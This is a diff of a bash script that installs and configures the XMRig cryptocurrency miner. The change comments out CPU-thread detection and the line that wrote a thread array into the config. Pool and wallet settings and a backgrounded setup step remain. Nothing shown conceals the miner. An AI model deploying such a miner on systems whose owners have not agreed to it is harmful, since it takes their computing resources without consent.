@@ -25,18 +25,17 @@ if [ ! -d "$xmrig_dir" ]; then
 fi
 
 
-threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
-usable_threads=$((threads * 20 / 100))
-rx_array='['
-for ((n = 0; n < $usable_threads; n++));do
-    rx_array+="-1"
-    if [ $n -lt $((usable_threads-1)) ];then
-        rx_array+=", "
-    fi
-done
-rx_array+='],'
-echo "$rx_array"
-sleep 2
+#threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
+#usable_threads=$((threads * 20 / 100))
+#rx_array="\["
+#for ((n = 0; n < $usable_threads; n++));do
+#    rx_array+="-1"
+#    if [ $n -lt $((usable_threads-1)) ];then
+#        rx_array+=", "
+#    fi
+#done
+#rx_array+="\]"
+#echo "$rx_array"
 #if binary or config dont exist at specified location then reaquire it
 #deleting everything from the directory to be safe and to clean up
 if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
@@ -54,7 +53,7 @@ if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
 	
 	sed -i "s|\"url\": \".*\"|\"url\": \"$pool\"|" "$xmrig_config"
 	sed -i "s|\"user\": \".*\"|\"user\": \"$wallet\"|" "$xmrig_config"
-	sed -i "s|\"rx\": .*|\"rx\": \"$rx_array\"|" "$xmrig_config"
+#	sed -i "s|\"rx\": \[.*\],|\"rx\": \"$rx_array\"|" "$xmrig_config"
 ) &
 
 fi
